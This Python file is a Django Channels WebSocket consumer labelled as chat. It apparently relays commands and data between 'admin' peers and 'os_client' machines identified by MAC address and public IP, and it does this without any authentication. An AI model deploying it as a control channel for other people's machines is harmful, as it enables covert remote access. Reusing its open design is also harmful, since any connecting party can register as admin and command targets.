import json
from channels.generic.websocket import AsyncWebsocketConsumer
from datetime import datetime

class ChatConsumer(AsyncWebsocketConsumer):
    users = []

    async def connect(self):
        self.room_name = self.scope["url_route"]["kwargs"]["room_name"]
        self.room_group_name = f"chat_{self.room_name}"

        # Join room group
        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
        await self.accept()

    async def disconnect(self, close_code):
        # Leave room group
        await self.channel_layer.group_discard(self.room_group_name, self.channel_name)

    async def receive(self, text_data):
        text_data_json = json.loads(text_data)

        # Check if the message is user info or a chat message
        if 'type' in text_data_json:
            r_type  = text_data_json['type']
            if r_type == 'os_client' or r_type == 'admin':
                user_info = {
                    "type": text_data_json["type"],
                    'username': text_data_json["username"],
                    "desktop": text_data_json["desktop"],
                    "macAddress": text_data_json["macAddress"],
                    "publicIp": text_data_json["publicIp"],
                    "connectedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                if not any(user['username'] == user_info['username'] for user in self.users):
                    self.users.append(user_info)
                # Broadcast the user info to the group
                await self.channel_layer.group_send(
                    self.room_group_name,
                    {"type": "users_connected", "users": self.users}
                )
            elif r_type == 'target_message':
                print(text_data_json)
                await self.channel_layer.group_send(
                    self.room_group_name,
                    {"type": "target_message", "target_mac": text_data_json["targetMacAddress"],
                     'message': text_data_json["message"], **{key: value for key, value in text_data_json.items() if key not in ["targetMacAddress", "message"]}}
                )
            elif r_type == 'target_data':
                await self.channel_layer.group_send(
                    self.room_group_name,
                    {"type": "target_data", "target_mac": text_data_json["targetMacAddress"],
                     'data': text_data_json["data"], 'sec_type': text_data_json["sec_type"]}
                )
            else:
                pass

    async def target_message(self, event):
        additional_data = {key: value for key, value in event.items() if key not in ["target_mac", "message"]}
        await self.send(text_data=json.dumps({
            "type": "target_message",
            "target_mac": event["target_mac"],
            "message": event["message"],
            **additional_data
        }))

    async def target_data(self, event):
        # Send updated user list back to the WebSocket
        await self.send(text_data=json.dumps({
            "type": "target_data",
            "target_mac": event["target_mac"],
            'data': event["data"],
            'sec_type': event["sec_type"]
        }))

    async def users_connected(self, event):
        users = event["users"]
        # Send updated user list back to the WebSocket
        await self.send(text_data=json.dumps({
            "type": "users_connected",
            "users": users
        }))

    async def chat_message(self, event):
        message = event["message"]
        await self.send(text_data=json.dumps(message))
